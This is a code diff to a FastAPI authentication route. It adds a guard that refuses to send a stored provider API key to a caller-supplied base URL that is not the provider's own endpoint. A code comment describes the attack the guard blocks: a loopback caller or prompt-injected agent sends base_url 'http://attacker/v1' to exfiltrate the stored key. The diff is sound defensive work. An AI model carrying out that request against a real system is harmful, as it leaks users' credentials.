@@ -316,6 +316,11 @@ def register_auth_routes(app: FastAPI, *, runtime=None, gateway=None, memory=Non
             raise HTTPException(status_code=400, detail="provider required")
         cfg = load_config()
         key = str(req.api_key or "").strip()
+        # Whether the key was pasted by the caller (they own it) vs pulled from
+        # the encrypted store (a secret the API must never send to an arbitrary
+        # host). base_url is caller-controlled — remember that too.
+        key_from_request = bool(key)
+        base_from_request = bool(str(req.base_url or "").strip())
         if not key:
             with contextlib.suppress(Exception):
                 key = str(resolve_provider_api_key(cfg, pid) or "").strip()
@@ -332,6 +337,40 @@ def register_auth_routes(app: FastAPI, *, runtime=None, gateway=None, memory=Non
                 base = str(cfg.get("llm_base_url") or "").strip()
             if not base:
                 base = str(meta.get("base_url") or "").strip()
+
+        # SECURITY: never send a STORED key to a caller-supplied base_url that
+        # is not the provider's own endpoint. Without this, a loopback caller
+        # (or a prompt-injected agent) could POST {provider:"openai",
+        # base_url:"http://attacker/v1"} with no key and exfiltrate the stored
+        # OpenAI key as a Bearer token. A pasted key (key_from_request) is the
+        # caller's own to send anywhere; a stored key is not.
+        if key and not key_from_request and base_from_request:
+            from urllib.parse import urlparse
+
+            def _host(u: str) -> str:
+                with contextlib.suppress(Exception):
+                    return (urlparse(u).hostname or "").lower()
+                return ""
+
+            allowed_hosts = {
+                _host(str(meta.get("base_url") or "")),
+                _host(str(cfg.get("llm_base_url") or "")),
+            }
+            allowed_hosts.discard("")
+            if _host(base) not in allowed_hosts:
+                return {
+                    "ok": False,
+                    "provider": pid,
+                    "base_url": base,
+                    "status": None,
+                    "latency_ms": None,
+                    "models": 0,
+                    "error": (
+                        "Refused: won't send the stored API key to a custom URL "
+                        "that isn't this provider's own endpoint. Paste the key "
+                        "explicitly to test an arbitrary endpoint."
+                    ),
+                }
 
         if pid == "anthropic" and key:
             from remedy.interfaces.anthropic_auth import is_subscription_oauth_token
